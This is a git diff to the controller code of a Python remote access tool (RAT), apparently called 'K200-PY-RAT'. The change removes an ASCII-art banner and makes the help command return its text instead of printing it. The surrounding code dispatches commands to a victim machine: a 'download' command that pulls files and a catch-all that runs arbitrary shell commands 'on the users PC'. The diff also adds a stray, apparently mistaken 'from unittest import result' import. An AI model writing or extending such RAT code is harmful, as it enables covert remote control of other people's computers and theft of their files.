@@ -1,17 +1,5 @@
 import socket, json, base64
-
-ART = """
-                                                            _..----.._    _
-                                                            .'  .--.    "-.(0)_
-                                                '-.__.-'"'=:|   ,  _)_ \__ . c\\'-..
-                                                            '''------'---''---'-"
-██╗  ██╗██████╗  ██████╗  ██████╗               ██████╗ ██╗   ██╗    ██████╗  █████╗ ████████╗
-██║ ██╔╝╚════██╗██╔═████╗██╔═████╗              ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
-█████╔╝  █████╔╝██║██╔██║██║██╔██║    █████╗    ██████╔╝ ╚████╔╝     ██████╔╝███████║   ██║   
-██╔═██╗ ██╔═══╝ ████╔╝██║████╔╝██║    ╚════╝    ██╔═══╝   ╚██╔╝      ██╔══██╗██╔══██║   ██║   
-██║  ██╗███████╗╚██████╔╝╚██████╔╝              ██║        ██║       ██║  ██║██║  ██║   ██║   
-╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝               ╚═╝        ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
-"""
+from unittest import result
 
 # Set the commands as a 2D array with descriptions for modularity
 commands = [
@@ -28,12 +16,13 @@ commands = [
 
 def helpCommand():
     total = 0
-    print("\nCommands: \n")
+    result = "\nCommands: \n"
     # Simple loop to send a description of all commands
     for x in commands:
-        print(f"[{total}] {commands[total][0]} - {commands[total][1]}")
+        result = result + "\n" + f"[{total}] {commands[total][0]} - {commands[total][1]}"
         total += 1
-    print("[∞] Anything - will run a command on the users PC like command prompt\n")
+    result = result + "\n" + "[∞] Anything - will run a command on the users PC like command prompt\n"
+    return result
 
 
 class Server:
@@ -86,7 +75,7 @@ class Server:
             if command[0] == "download" and "[-] Error" not in result:
                 result = self.writeFile(command[1], result)
             elif command[0] == "ratHelp":
-                helpCommand()
+                result = helpCommand()
         except Exception:
             result = "[-] Error running command, check the syntax of the command."
         return result
